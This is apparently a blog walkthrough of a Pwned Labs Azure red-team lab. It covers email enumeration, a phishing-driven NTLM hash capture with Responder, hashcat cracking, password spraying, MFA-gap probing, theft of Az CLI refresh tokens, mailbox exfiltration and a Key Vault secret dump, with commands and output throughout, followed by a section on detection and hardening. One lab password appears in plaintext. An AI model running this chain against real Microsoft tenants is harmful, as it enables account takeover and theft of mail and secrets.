---
title: Phished for Initial Access
description: Phished for Initial Access
image:
  path: azure.webp
categories:
- Pwned Labs
- Azure
layout: post
media_subpath: /assets/posts/labs/pwnedlabs/azure/
tags:
- pwnedlabs
- azure
- cloud
---
# Scenario
On a red team engagement for our client Mega Big Tech, your team has been asked to simulate opportunistic threat actors. In scope is the on-premises and Azure cloud infrastructure, and phishing is also permitted. They have recently hardened their perimeter in terms of publicly accessible services - can you show them that there are other ways in?

Mega Big Tech will begin rolling out their own External Authentication Provider to reduce yearly operating costs. However, threat actors have already compromised the custom provider and altered its configuration. As a result, any Multifactor Authentication (MFA) challenge will now automatically return as successful, ultimately satisfying any Conditional Access Policy (CAP) that requires the standalone-MFA grant control (as opposed to the Authentication Strength-MFA grant control).

# Walkthrough
Since phishing is in scope, we have to know the email format of the company. Let's use [Oh365UserFinder](https://github.com/dievus/Oh365UserFinder). Let's make sure that the domain exists
```
└─$ python3 oh365userfinder.py -d megabigtech.com         

   ____  __   _____ _____ ______   __  __                  _______           __          
  / __ \/ /_ |__  // ___// ____/  / / / /_______  _____   / ____(_)___  ____/ /__  _____
 / / / / __ \ /_ </ __ \/___ \   / / / / ___/ _ \/ ___/  / /_  / / __ \/ __  / _ \/ ___/ 
/ /_/ / / / /__/ / /_/ /___/ /  / /_/ (__  )  __/ /     / __/ / / / / / /_/ /  __/ /     
\____/_/ /_/____/\____/_____/   \____/____/\___/_/     /_/   /_/_/ /_/\__,_/\___/_/     

                                   Version 1.1.2                                         
                               A project by The Mayor                                    
                        Oh365UserFinder.py -h to get started                            

------------------------------------------------------------------------------------------

[info] Starting Oh365 User Finder at Mon Sep  1 23:56:01 2025

[info] Checking if the megabigtech.com exists...

[success] The listed domain megabigtech.com exists. Domain is Managed.

[info] Scan completed at Mon Sep  1 23:56:02 2025
```

It exists. Now we need to find email format for the user. We can use the same tool. Currently, the tool responds with `Result -  Desktop SSO Enabled [!]` if the email format is wrong.
```
└─$ python3 oh365userfinder.py -e s.olsson@megabigtech.com

   ____  __   _____ _____ ______   __  __                  _______           __          
  / __ \/ /_ |__  // ___// ____/  / / / /_______  _____   / ____(_)___  ____/ /__  _____
 / / / / __ \ /_ </ __ \/___ \   / / / / ___/ _ \/ ___/  / /_  / / __ \/ __  / _ \/ ___/ 
/ /_/ / / / /__/ / /_/ /___/ /  / /_/ (__  )  __/ /     / __/ / / / / / /_/ /  __/ /     
\____/_/ /_/____/\____/_____/   \____/____/\___/_/     /_/   /_/_/ /_/\__,_/\___/_/     

                                   Version 1.1.2                                         
                               A project by The Mayor                                    
                        Oh365UserFinder.py -h to get started                            

------------------------------------------------------------------------------------------

[info] Starting Oh365 User Finder at Mon Sep  1 23:18:24 2025

[!] s.olsson@megabigtech.com                             Result -  Desktop SSO Enabled [!] 
```

Email formats has many forms, with some common variations in the list below. This format is usually standardized within a company. Save the list below to a file.
```
First Name + Last Name: samolsson@megabigtech.com
First Initial + Last Name: solsson@megabigtech.com
First Name + Last Initial: samo@megabigtech.com
First Initial + Last Initial: so@megabigtech.com
Full Name with Dot: sam.olsson@megabigtech.com
First Initial (dot) Last Name: s.olsson@megabigtech.com
```

Now, run the tool again with the list passed as parameter. After tool finishes, we can see that we have a hit with `sam.olsson@megabigtech.com`
```
└─$ python3 oh365userfinder.py -r emails.list 

   ____  __   _____ _____ ______   __  __                  _______           __          
  / __ \/ /_ |__  // ___// ____/  / / / /_______  _____   / ____(_)___  ____/ /__  _____
 / / / / __ \ /_ </ __ \/___ \   / / / / ___/ _ \/ ___/  / /_  / / __ \/ __  / _ \/ ___/ 
/ /_/ / / / /__/ / /_/ /___/ /  / /_/ (__  )  __/ /     / __/ / / / / / /_/ /  __/ /     
\____/_/ /_/____/\____/_____/   \____/____/\___/_/     /_/   /_/_/ /_/\__,_/\___/_/     

                                   Version 1.1.2                                         
                               A project by The Mayor                                    
                        Oh365UserFinder.py -h to get started                            

------------------------------------------------------------------------------------------

[info] Starting Oh365 User Finder at Mon Sep  1 23:19:55 2025

[!] samolsson@megabigtech.com                            Result -  Desktop SSO Enabled [!] 
[!] solsson@megabigtech.com                              Result -  Desktop SSO Enabled [!] 
[!] samo@megabigtech.com                                 Result -  Desktop SSO Enabled [!] 
[!] so@megabigtech.com                                   Result -  Desktop SSO Enabled [!] 
[!] sam.olsson@megabigtech.com                           Result -  Desktop SSO Enabled [!] 
[+] sam.olsson@megabigtech.com                           Result -   Valid Email Found! [+]
[!] s.olsson@megabigtech.com                             Result -  Desktop SSO Enabled [!] 

[info] Oh365 User Finder discovered one valid login account.                                                                                                                                                                                

[info] Scan completed at Mon Sep  1 23:20:04 2025       
```

Since company uses Azure, there's a high chance that they use Active Directory and Windows. Thus, we can try to corce the target user to authenticate to our malicious server. When user authenticates to our malicious server (for example SMB), it will trigger the NTLM [authentication](https://learn.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm) process

We can create a malicious SMB server using [Responder](https://github.com/lgandx/Responder), which is a LLMNR, NBT-NS and MDNS poisoner that also has inbuilt HTTP/SMB/MSSQL/FTP/LDAP rogue authentication servers, which also supports a wide variety of authentication methods. 
```
└─$ python3 Responder.py -I eth0
```
With Responder running, we need to create a malicious email. We ask the user to copy the UNC (file server) path to a run box, paste and click `OK` to open it, forcing authentication. The IP address is our rogue SMB server.

![](phished-for-initial-access-1.png)

After few minutes, we get a hit and successfully capture the `Net-NTLMv2` hash of the `SECURITY-PC\sam` user.

![](phished-for-initial-access-2.png)

Save the hash in the file and use `hashcat` to crack it
```
└─$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

![](phished-for-initial-access-3.png)

It worked, now we have the password for `SECURITY-PC\sam`


It's worth checking if Sam Olsson has also set this password for their corporate `sam.olsson@megabigtech.com` account. Let's use `Oh365UserFinder` again. Save the valid email in the file. Note that we can't validate credentials for single emails using the tool, as the `-e` parameter is just for identifying users.
```
└─$ python3 oh365userfinder.py -p '<REDACTED>' --pwspray --elist emails.list

   ____  __   _____ _____ ______   __  __                  _______           __          
  / __ \/ /_ |__  // ___// ____/  / / / /_______  _____   / ____(_)___  ____/ /__  _____
 / / / / __ \ /_ </ __ \/___ \   / / / / ___/ _ \/ ___/  / /_  / / __ \/ __  / _ \/ ___/ 
/ /_/ / / / /__/ / /_/ /___/ /  / /_/ (__  )  __/ /     / __/ / / / / / /_/ /  __/ /     
\____/_/ /_/____/\____/_____/   \____/____/\___/_/     /_/   /_/_/ /_/\__,_/\___/_/     

                                   Version 1.1.2                                         
                               A project by The Mayor                                    
                        Oh365UserFinder.py -h to get started                            

------------------------------------------------------------------------------------------

[info] Starting Oh365 User Finder at Tue Sep 23 00:29:14 2025

[+] sam.olsson@megabigtech.com                   Result -   VALID PASSWORD - MFA ENABLED [+]

[info] Oh365 User Finder discovered one valid credential pair.

[info] Scan completed at Tue Sep 23 00:29:15 2025
```

It reports that MFA is enabled. However, MFA enablement doesn't means that everything is protected by MFA. Azure administrators can also set conditional access policies to set fine tune MFA policies, and often this fine tuned policies leave gaps that can be exploited. A great tool that can check for MFA enforcement among a (not exhaustive) list of Microsoft online services is [MFASweep](https://github.com/dafthack/MFASweep)
```
└─PS> Invoke-MFASweep -Username sam.olsson@megabigtech.com -Password theD@RKni9ht -Recon
---------------- MFASweep ----------------
<SNIP>
######### SINGLE FACTOR ACCESS RESULTS #########
Microsoft Graph API                  | YES                                                                                                                                                                                                  
Microsoft Service Management API     | YES                                                                                                                                                                                                  
M365 w/ Windows UA                   | NO                                                                                                                                                                                                   
M365 w/ Linux UA                     | NO
M365 w/ MacOS UA                     | NO
M365 w/ Android UA                   | NO
M365 w/ iPhone UA                    | NO
M365 w/ Windows Phone UA             | NO
Exchange Web Services (BASIC Auth)   | NO
Active Sync (BASIC Auth)             | NO
```
We see that single factor authentication is enabled for the Microsoft Graph and Azure Resource Manager API. Let's login to Azure Portal. In the `Resources` section we see a Logic app named `security-alert`.

![](phished-for-initial-access-4.png)

`Versions` show only single version.

![](phished-for-initial-access-5.png)

After clicking on the version, we see the configuration that performs an `HTTP` action when a new email is received. It contains credentials used to access an Azure function App using basic authentication

![](phished-for-initial-access-6.png)

We don't seem to be able to access the function app, but maybe we can try to login to Azure with those credentials? Even though the `--pwspray` parameter is specified, we are only trying one password, and so it will only send a single authentication request. However, as we have internal access now, it makes sense for us to examine the lockout policy to prevent unintentionally locking any account, as we proceed through this engagement.

Let's login to the Microsoft Graph API since it only requires a single factor of authentication for our user
```
└─PS> Connect-MgGraph                                          
Welcome to Microsoft Graph!

Connected via delegated access using 14d82eec-204b-4c2f-b7e8-296a70dab67e
Readme: https://aka.ms/graph/sdk/powershell
SDK Docs: https://aka.ms/graph/sdk/powershell/docs
API Docs: https://aka.ms/graph/docs

NOTE: You can use the -NoWelcome parameter to suppress this message.
```
To get the Password protection settings that include the lockout and password policies we can use the Microsoft Graph Beta API
```
└─PS> Install-Module Microsoft.Graph.Beta.Identity.DirectoryManagement
```
```
└─PS> Get-MgBetaDirectorySetting |where {$_.templateId -eq "5cf42378-d67d-4f36-ba46-e8b86229381d"} |convertto-json -Depth 50
{
  "DisplayName": "Password Rule Settings",
  "Id": "cfa57aa1-e6e8-4ff3-9b4e-4295f5619167",
  "TemplateId": "5cf42378-d67d-4f36-ba46-e8b86229381d",
  "Values": [
    {
      "Name": "BannedPasswordCheckOnPremisesMode",
      "Value": "Audit"
    },
    {
      "Name": "EnableBannedPasswordCheckOnPremises",
      "Value": "False"
    },
    {
      "Name": "EnableBannedPasswordCheck",
      "Value": "False"
    },
    {
      "Name": "LockoutDurationInSeconds",
      "Value": "5"
    },
    {
      "Name": "LockoutThreshold",
      "Value": "50"
    },
    {
      "Name": "BannedPasswordList",
      "Value": ""
    }
  ],
  "AdditionalProperties": {}
}
```
The accounts are only locked out for 5 seconds, after 50 failed authentication attempts. The policy also doesn't have a list of banned passwords.

With `oh365userfinder.py` we confirm that we have compromised another user.
```
└─$ python3 oh365userfinder.py -p <REDACTED> --pwspray --elist emails.list     

   ____  __   _____ _____ ______   __  __                  _______           __          
  / __ \/ /_ |__  // ___// ____/  / / / /_______  _____   / ____(_)___  ____/ /__  _____
 / / / / __ \ /_ </ __ \/___ \   / / / / ___/ _ \/ ___/  / /_  / / __ \/ __  / _ \/ ___/ 
/ /_/ / / / /__/ / /_/ /___/ /  / /_/ (__  )  __/ /     / __/ / / / / / /_/ /  __/ /     
\____/_/ /_/____/\____/_____/   \____/____/\___/_/     /_/   /_/_/ /_/\__,_/\___/_/     

                                   Version 1.1.2                                         
                               A project by The Mayor                                    
                        Oh365UserFinder.py -h to get started                            

------------------------------------------------------------------------------------------

[info] Starting Oh365 User Finder at Tue Sep 23 14:58:05 2025

[+] sunita.williams@megabigtech.com              Result -                VALID PASSWORD! [+]

[info] Oh365 User Finder discovered one valid credential pair.

[info] Scan completed at Tue Sep 23 14:58:07 2025

```

Let's run MFASweep again.
```
─PS> Invoke-MFASweep -Username sunita.williams@megabigtech.com -Password '<REDACTED>' -Recon                                                                                                                                            
---------------- MFASweep ----------------
<SNIP>
######### SINGLE FACTOR ACCESS RESULTS #########
Microsoft Graph API                  | YES
Microsoft Service Management API     | YES
M365 w/ Windows UA                   | NO
M365 w/ Linux UA                     | NO
M365 w/ MacOS UA                     | NO
M365 w/ Android UA                   | NO
M365 w/ iPhone UA                    | NO
M365 w/ Windows Phone UA             | NO
Exchange Web Services (BASIC Auth)   | NO
Active Sync (BASIC Auth)             | NO
```
It's worth noting that desktop clients are not configured to enforce MFA for this user. [Conditional access policies](https://learn.microsoft.com/en-us/entra/identity/conditional-access/concept-conditional-access-conditions#device-platforms) also allow administrators to configure permitted device platforms / operating systems. However Microsoft recommend against using purely this condition as it is evaluated based on the user-provided User Agent value. 

![](phished-for-initial-access-7.png)

It's worth implementing your own policies and see the output of various tooling based on different conditions.

![](phished-for-initial-access-8.png)

We can try logging in using the Azure CLI (via the Microsoft Service Management API) with the username and password, which could work if a compromised External Authentication Provider is in play
```
└─$ az login
A web browser has been opened at https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize. Please continue the login in the web browser. If no web browser is available or if the web browser fails to open, use device code flow with `az login --use-device-code`.

Retrieving tenants and subscriptions for the selection...

[Tenant and subscription selection]

No     Subscription name            Subscription ID                       Tenant
-----  ---------------------------  ------------------------------------  -----------------
[1] *  Microsoft Azure Sponsorship  ceff06cb-e29d-4486-a3ae-eaaec5689f94  Default Directory

The default is marked with an *; the default tenant is 'Default Directory' and subscription is 'Microsoft Azure Sponsorship' (ceff06cb-e29d-4486-a3ae-eaaec5689f94).

Select a subscription and tenant (Type a number or Enter for no changes): 1

Tenant: Default Directory
Subscription: Microsoft Azure Sponsorship (ceff06cb-e29d-4486-a3ae-eaaec5689f94)

[Announcements]
With the new Azure CLI login experience, you can select the subscription you want to use more easily. Learn more about it and its configuration at https://go.microsoft.com/fwlink/?linkid=2271236

If you encounter any problem, please open an issue at https://aka.ms/azclibug

[Warning] The login output has been updated. Please be aware that it no longer displays the full list of available subscriptions by default.
```

We successfully authenticate
```
└─$ az account show            
{
  "environmentName": "AzureCloud",
  "homeTenantId": "2590ccef-687d-493b-ae8d-441cbab63a72",
  "id": "ceff06cb-e29d-4486-a3ae-eaaec5689f94",
  "isDefault": true,
  "managedByTenants": [],
  "name": "Microsoft Azure Sponsorship",
  "state": "Enabled",
  "tenantDefaultDomain": "megabigtech.com",
  "tenantDisplayName": "Default Directory",
  "tenantId": "2590ccef-687d-493b-ae8d-441cbab63a72",
  "user": {
    "name": "Sunita.Williams@megabigtech.com",
    "type": "user"
  }
}

```

We can obtain our current access token using the `az account get-access-token`
```
└─$ az account get-access-token
{
  "accessToken": "<REDACTED>",
  "expiresOn": "2025-09-23 16:23:06.000000",
  "expires_on": 1758622986,
  "subscription": "ceff06cb-e29d-4486-a3ae-eaaec5689f94",
  "tenant": "2590ccef-687d-493b-ae8d-441cbab63a72",
  "tokenType": "Bearer"
}

```

In Azure and other OAuth 2.0-based systems, access and refresh tokens play different roles in managing and maintaining authentication and authorization.

- Access Token
  - Purpose: An access token is used to grant access to a protected resource, like an API. It acts as a proof of authorization (but not authentication) provided by the authentication server after a successful authentication process.
  - Lifetime: Access tokens are typically short-lived, ranging from a few minutes to hours, to minimize the risk if the token is compromised. The exact lifetime can depend on the system's security policies.
  - Usage: They are sent with HTTP requests to access protected resources. Once the server validates that the token is valid, it grants access to the resource.
  - Content: The JSON Web Token (JWT) contains claims about the bearer and the authorized scopes.
- Refresh Token
  - Purpose: A refresh token is used to obtain a new access token when the current access token is expired or about to expire, without requiring the user to go through another login process.
  - Lifetime: They are generally longer-lived than access tokens. It can last from hours to days, or even indefinitely, depending on the system's configuration and policies.
  - Usage: They are exchanged with the authentication server for a new access token (and optionally, a new refresh token) when needed.
  - Content: Typically an opaque string, not meant to be interpreted or used by clients other than to request new access tokens.

Access token can be used only for a specific scope of a specific service, whereas a refresh token can be used to craft access token for other services to which the user may be permissioned. This can allow us to move laterally to other services, and potentially bypass any MFA enforcement configured for those services.

On Mac and Linux the Az CLI access and refresh tokens are stored in plaintext in the file `~/.azure/msal_token_cache.json`

On Windows the tokens are stored in `%userprofile%\.azure\msal_token_cache.bin` and encrypted using DPAPI. We can export the tokens from `msal_token_cache.bin` using the `Export-AzureCliTokens / Export-AADIntAzureCliTokens` function in [AccessToken_utils.ps1](https://www.powershellgallery.com/packages/AADInternals-Endpoints/0.9.6/Content/AccessToken_utils.ps1) from [AADInternals-Endpoints](https://github.com/Gerenios/AADInternals-Endpoints).

Interestingly, the refresh tokens seem not to be stored in the `MSALCache`. If you add `Write-Output $tokens` just before `$objTokens = $tokens | ConvertFrom-Json` in the function `Export-AzureCliTokens` in `AccessToken_utils.ps1`, we see all the AccessToken and IdToken values but no RefreshToken values.

Alternatively, we can also install an older version of the Az CLI on a test Windows VM, as these older versions store both access and refresh tokens unprotected in the file `%userprofile%\.azure\accessTokens.json`.
```
winget uninstall Microsoft.AzureCLI --all-versions
Invoke-WebRequest -Uri https://azurecliprod.blob.core.windows.net/msi/azure-cli-2.3.0.msi -OutFile .\AzureCLI.msi; Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet'; rm .\AzureCLI.msi
```

There are a few tools that can help us with moving laterally to other services. The one we'll use is [TokenTacticsV2](https://github.com/f-bader/TokenTacticsV2). 
```
└─$ cat ~/.azure/msal_token_cache.json
```
```
└─PS> Invoke-RefreshToMSGraphToken -domain megabigtech.com -refreshToken "<REDACTED>"                                                                                          
✓  Token acquired and saved as $MSGraphToken

token_type     : Bearer
scope          : email openid profile https://graph.microsoft.com/AuditLog.Create https://graph.microsoft.com/Calendar.ReadWrite https://graph.microsoft.com/Calendars.Read.Shared https://graph.microsoft.com/Calendars.ReadWrite 
                 https://graph.microsoft.com/Contacts.ReadWrite https://graph.microsoft.com/DataLossPreventionPolicy.Evaluate https://graph.microsoft.com/Directory.AccessAsUser.All https://graph.microsoft.com/Directory.Read.All 
                 https://graph.microsoft.com/Files.Read https://graph.microsoft.com/Files.Read.All https://graph.microsoft.com/Files.ReadWrite.All https://graph.microsoft.com/FileStorageContainer.Selected 
                 https://graph.microsoft.com/Group.Read.All https://graph.microsoft.com/Group.ReadWrite.All https://graph.microsoft.com/InformationProtectionPolicy.Read https://graph.microsoft.com/Mail.ReadWrite 
                 https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/Notes.Create https://graph.microsoft.com/Organization.Read.All https://graph.microsoft.com/People.Read https://graph.microsoft.com/People.Read.All 
                 https://graph.microsoft.com/Printer.Read.All https://graph.microsoft.com/PrinterShare.ReadBasic.All https://graph.microsoft.com/PrintJob.Create https://graph.microsoft.com/PrintJob.ReadWriteBasic 
                 https://graph.microsoft.com/Reports.Read.All https://graph.microsoft.com/SensitiveInfoType.Detect https://graph.microsoft.com/SensitiveInfoType.Read.All https://graph.microsoft.com/SensitivityLabel.Evaluate 
                 https://graph.microsoft.com/Tasks.ReadWrite https://graph.microsoft.com/TeamMember.ReadWrite.All https://graph.microsoft.com/TeamsTab.ReadWriteForChat https://graph.microsoft.com/User.Read.All 
                 https://graph.microsoft.com/User.ReadBasic.All https://graph.microsoft.com/User.ReadWrite https://graph.microsoft.com/Users.Read https://graph.microsoft.com/.default
expires_in     : 3711
ext_expires_in : 3711

```

We can check the token 
```
└─PS> $MSGraphToken.access_token
<REDACTED>
```

We can try to download email with [this script](https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/Tokens/exfil_exchange_mail.py). Download it and input the MSGraph access token.
```
└─$ python3 ./exfil_exchange_mail.py
HTML email downloaded: URGENT: Change Password.html
HTML email downloaded: URGENT: Change Password.html
HTML email downloaded: sunita_adm.html
HTML email downloaded: sunita_adm.html
HTML email downloaded: Re: My Trip Expenses.html
HTML email downloaded: My Trip Expenses.html
HTML email downloaded: Loaner laptop updates.html
HTML email downloaded: Re: Phishing awareness training.html
All emails downloaded.
```

The email `sunita_adm` contains credentials for sunita_adm
```
└─$ python3 oh365userfinder.py -p '<REDACTED>' --pwspray --elist emails.list 

   ____  __   _____ _____ ______   __  __                  _______           __
  / __ \/ /_ |__  // ___// ____/  / / / /_______  _____   / ____(_)___  ____/ /__  _____
 / / / / __ \ /_ </ __ \/___ \   / / / / ___/ _ \/ ___/  / /_  / / __ \/ __  / _ \/ ___/
/ /_/ / / / /__/ / /_/ /___/ /  / /_/ (__  )  __/ /     / __/ / / / / / /_/ /  __/ /
\____/_/ /_/____/\____/_____/   \____/____/\___/_/     /_/   /_/_/ /_/\__,_/\___/_/

                                   Version 1.1.2
                               A project by The Mayor
                        Oh365UserFinder.py -h to get started

------------------------------------------------------------------------------------------

[info] Starting Oh365 User Finder at Tue Sep 23 15:36:32 2025

[+] sunita_adm@megabigtech.com                   Result -                VALID PASSWORD! [+]

[info] Oh365 User Finder discovered one valid credential pair.

[info] Scan completed at Tue Sep 23 15:36:34 2025     
```
We can confirm that this is a valid Microsoft account, that although it's an admin account is not subject to MFA
```
└─PS> Invoke-MFASweep -Username sunita_adm@megabigtech.com -Password '<REDACTED>' -Recon
---------------- MFASweep ----------------
<SNIP>
######### SINGLE FACTOR ACCESS RESULTS #########
Microsoft Graph API                  | YES
Microsoft Service Management API     | YES
M365 w/ Windows UA                   | YES
M365 w/ Linux UA                     | YES
M365 w/ MacOS UA                     | NO
M365 w/ Android UA                   | YES
M365 w/ iPhone UA                    | NO
M365 w/ Windows Phone UA             | NO
Exchange Web Services (BASIC Auth)   | NO
Active Sync (BASIC Auth)             | NO
```

The Microsoft Graph does not require MFA. The Microsoft Service Management API, on the other hand, provides much of the functionality of the Azure Portal, and allows us to interact with the Azure Resource Manager.
```
└─PS> Connect-AzAccount -AccountId "sunita_adm@megabigtech.com" -UseDeviceAuthentication
WARNING: You may need to login again after updating "EnableLoginByWam".
Please select the account you want to login with.

[Login to Azure] To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code HH5XVWP38 to authenticate.
Retrieving subscriptions for the selection...

Subscription name           Tenant
-----------------           ------
Microsoft Azure Sponsorship Default Directory

```

See like we have permission to access the Azure Key Vault named `MBT-Admins`
```
└─PS> Get-AzResource

Name              : MBT-Admins
ResourceGroupName : mbt-rg-9
ResourceType      : Microsoft.KeyVault/vaults
Location          : eastus
ResourceId        : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-9/providers/Microsoft.KeyVault/vaults/MBT-Admins
Tags              : 

```
We retrieve all secrets and get the global admin password
```
└─PS> $VaultName = "MBT-Admins"
```
```
└─PS> Get-AzKeyVaultSecret -VaultName $VaultName | ForEach-Object { Get-AzKeyVaultSecret -VaultName $VaultName -Name $_.Name -asplaintext }
<REDACTED>
mbt-ga:<REDACTED>
```
# Attack path
Attack path visualization created by [Mathias Persson](https://www.linkedin.com/in/mathias-persson-582b60197/) for Pwned Labs

![](phished-for-initial-access-9.png)

# Defense

MFASweep activity is quite noisy and will show up in the [Entra ID sign-in logs](https://portal.azure.com/#view/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade/~/SignIns)

We can also get failed sign-ins from the command line using the PowerShell cmdlet `Get-MgAuditLogSignIn` (part of the Microsoft.Graph module)

This script is provided for example purposes and so that you can run this in your own Azure account. The credentials in this lab won't be able to query the sign-in logs.
```
# Install-Module Microsoft.Graph -Scope CurrentUser

$startDate = (Get-Date).AddDays(-1).ToString("yyyy-MM-ddTHH:mm:ssZ")
$endDate = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
$signIns = Get-MgAuditLogSignIn -Filter "createdDateTime ge $startDate and createdDateTime le $endDate" -All
$failedSignIns = $signIns | Where-Object {
    ($_.Status.ErrorCode -eq 50076) -or ($_.Status.ErrorCode -eq 50158)
}

$userFailedSignInDetails = @{}
foreach ($signIn in $failedSignIns) {

    $userId = $signIn.UserPrincipalName
    $ipAddress = $signIn.IpAddress
    $signInTime = $signIn.CreatedDateTime
    $Application = $signIn.AppDisplayName

    $attemptKey = "$userId|$ipAddress|$signInTime|$Application"

    if ($userFailedSignInDetails.ContainsKey($userId)) {
        $userFailedSignInDetails[$userId] += @($attemptKey)
    } else {
        $userFailedSignInDetails[$userId] = @($attemptKey)
    }
}

foreach ($user in $userFailedSignInDetails.Keys) {
    Write-Output "User: $user"
    $attempts = $userFailedSignInDetails[$user] | Sort-Object -Unique
    Write-Output "Total Failed Sign-Ins: $($attempts.Count)"
    foreach ($attempt in $attempts) {
        $details = $attempt -split '\|'
        Write-Output "Time: $($details[2]), IP: $($details[1]), Service: $($details[3])"
    }
    Write-Output "---------------------------------------------"
}
```
We can also use `Sentinel KQL (Kusto Query Language)` to identify indicators of malicious activity.
```
SigninLogs
| where ResultType != 0
| summarize FailedLoginCount = count() by ResourceDisplayName, UserPrincipalName
| sort by FailedLoginCount desc nulls last
```

- Prevent workstations from sending [NTLM traffic to remote servers](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-outgoing-ntlm-traffic-to-remote-servers). 
- Implement MFA enforcement policies and trusted devices and locations, instead of allowing anyone from the internet with valid credentials from being able to authenticate and interact with Azure.
- Don't store credentials in email and other user productivity tools. 
  - Productivity tools and services such as Outlook and MS Teams are an attractive target for threat actors and potentially also allow for further social engineering.
Further reading:
- https://academy.simplycyber.io/l/pdp/hands-on-phishing
- https://www.microsoft.com/en-us/security/blog/2022/11/16/token-tactics-how-to-prevent-detect-and-respond-to-cloud-token-theft/
- https://trustedsec.com/blog/hacking-your-cloud-tokens-edition-2-0
